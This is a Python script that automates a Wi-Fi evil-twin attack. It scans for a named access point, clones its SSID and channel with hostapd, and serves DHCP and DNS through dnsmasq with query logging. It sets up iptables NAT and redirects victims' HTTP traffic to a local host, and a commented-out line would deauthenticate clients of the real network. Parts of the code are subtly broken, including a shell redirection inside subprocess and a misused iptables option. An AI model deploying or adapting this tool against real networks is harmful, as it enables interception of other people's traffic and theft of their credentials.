import subprocess
import csv
from threading import Timer
from os import system
import time

subprocess.call(['rm', 'output-01.csv'])
subprocess.call(['airmon-ng', 'start', 'wlan0'])
p = subprocess.Popen(["airodump-ng", "wlan0mon", "-w", "output", "--output-format", "csv"])
time.sleep(10)
p.terminate()

#subprocess.call(["airmon-ng", "start", "wlan0"])
#print('Press Ctrl + C to choose an Access Point')
#system('airodump-ng wlan0mon -w output --output-format csv')

macAddr = ''
channel = ''
name = ' ' + input("Type in Access Point name: ")
with open('output-01.csv', newline='') as f:
    for row in f:
        line = row.split(',')
        # If you take in some argument here instead of hardcoded AP name
        if (name in line):
            #print(line)
            macAddr = line[0]
            channel = line[3].replace(" ", "")
        #print(macAddr)
        #print(channel)

#print(name)
#print(macAddr)
#print(channel)

subprocess.call(['rm', 'hostapd.conf'])

with open('hostapd.conf', 'w') as f:
    f.write('interface=wlan0mon\n')
    f.write('driver=nl80211\n')
    f.write('ssid=' + name[1:] + '\n')
    f.write('hw_mode=g\n')
    f.write('channel=' + channel + '\n')
    #f.write('wpa_passphrase=password\n')


#subprocess.call(['airodump-ng', '--bssid', macAddr, '-w', 'client_bssids', '--output-format', 'csv', 'wlan0mon'])
#subprocess.call(['aireplay-ng', '--deauth', '20'  , '-a', macAddr, 'wlan0mon'])

# Configure iptables to reroute traffic
subprocess.call(['ifconfig', 'wlan0mon', 'up', '192.168.1.1', 'netmask', '255.255.255.0'])
subprocess.call(['route', 'add', '-net', '192.168.1.0', 'netmask', '255.255.255.0', 'gw', '192.168.1.1'])
subprocess.call(['iptables', '--table', 'nat', '--append', 'POSTROUTING', '--out-interface', 'eth0', '-j', 'MASQUERADE'])
subprocess.call(['iptables', '--append', 'FORWARD', '--in-interface', 'wlan0mon', '-j', 'ACCEPT'])
subprocess.call(['echo', '1', '>', '/proc/sys/net/ipv4/ip_forward'])
subprocess.call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-destination', '192.168.1.109:80'])
subprocess.call(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-j', 'MASQUERADE'])

subprocess.Popen(['hostapd', 'hostapd.conf'])

subprocess.call(['rm', 'dnsmasq.conf'])

with open('dnsmasq.conf', 'w') as f:
    f.write('interface=wlan0mon\n')
    f.write('dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0, 2h\n')
    f.write('dhcp-option=3,192.168.1.1\n')
    f.write('dhcp-option=6,192.168.1.1\n')
    f.write('server=8.8.8.8\n')
    f.write('log-queries\n')
    f.write('log-dhcp\n')
    f.write('listen-address=127.0.0.1\n')

subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf', '-d'])
